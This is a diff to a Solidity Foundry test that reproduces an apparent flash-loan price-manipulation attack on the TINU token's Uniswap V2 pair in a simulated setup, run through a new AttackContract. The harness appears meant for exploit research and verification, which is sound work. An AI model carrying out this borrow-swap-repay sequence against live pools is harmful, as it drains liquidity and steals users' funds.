@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "./AttackContract.sol";
 import "./TINU.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
@@ -14,13 +15,15 @@ contract TINUTest is Test, BlockLoader {
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address tinuAddr;
     address wethAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1674717035;
     uint112 reserve0pair = 1781945970074638149262;
     uint112 reserve1pair = 22144561461014981232;
@@ -39,9 +42,7 @@ contract TINUTest is Test, BlockLoader {
     uint256 balanceOftinu = 0;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         tinu = new TINU(
             payable(0x9980A74fCBb1936Bc79Ddecbd4148f7511598521),
             payable(0xEBA4a1e0ff3baF18A9D2910874Ffaee11911Cc31)
@@ -69,13 +70,15 @@ contract TINUTest is Test, BlockLoader {
         factoryAddr = address(factory);
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         tinu.afterDeploy(address(router), address(pair));
         // Initialize balances and mock flashloan.
         weth.transfer(address(pair), balanceOfwethpair);
         tinu.transfer(address(pair), balanceOftinupair);
         weth.approve(attacker, UINT256_MAX);
         tinu.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -116,9 +119,17 @@ contract TINUTest is Test, BlockLoader {
             tinu.decimals()
         );
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(weth), attacker, weth.decimals());
-        queryERC20BalanceDecimals(address(tinu), attacker, tinu.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(weth),
+            address(attackContract),
+            weth.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(tinu),
+            address(attackContract),
+            tinu.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -185,6 +196,7 @@ contract TINUTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
         borrow_weth(22e18);
         printBalance("After step0 ");
         swap_pair_weth_tinu(weth.balanceOf(attacker));
@@ -198,6 +210,7 @@ contract TINUTest is Test, BlockLoader {
         payback_weth((22e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -207,6 +220,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -215,6 +229,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt3);
         payback_weth(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -224,6 +239,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -231,6 +247,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt3);
         payback_weth(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -241,6 +258,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -249,6 +267,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt4);
         payback_weth(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -258,6 +277,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -266,6 +286,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt3);
         payback_weth(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -276,6 +297,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -284,6 +306,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt4);
         payback_weth(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -294,6 +317,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -303,6 +327,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt4);
         payback_weth(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -314,6 +339,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -323,6 +349,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt5);
         payback_weth(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand006(
@@ -333,6 +360,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt4,
         uint256 amt5
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt5 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -342,6 +370,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt4);
         payback_weth(amt5);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand007(
@@ -353,6 +382,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -362,6 +392,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt5);
         payback_weth(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand008(
@@ -373,6 +404,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -383,6 +415,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt5);
         payback_weth(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand009(
@@ -395,6 +428,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -405,6 +439,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt6);
         payback_weth(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand010(
@@ -416,6 +451,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt5,
         uint256 amt6
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt6 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -426,6 +462,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt5);
         payback_weth(amt6);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand011(
@@ -438,6 +475,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -448,6 +486,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt6);
         payback_weth(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand012(
@@ -460,6 +499,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -471,6 +511,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt6);
         payback_weth(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand013(
@@ -484,6 +525,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -495,6 +537,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt7);
         payback_weth(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand014(
@@ -507,6 +550,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt6,
         uint256 amt7
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt7 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -518,6 +562,7 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt6);
         payback_weth(amt7);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand015(
@@ -531,6 +576,7 @@ contract TINUTest is Test, BlockLoader {
         uint256 amt7,
         uint256 amt8
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt8 == (amt0 * 1003) / 1000);
         borrow_weth(amt0);
         swap_pair_weth_tinu(amt1);
@@ -543,5 +589,6 @@ contract TINUTest is Test, BlockLoader {
         swap_pair_tinu_weth(amt7);
         payback_weth(amt8);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
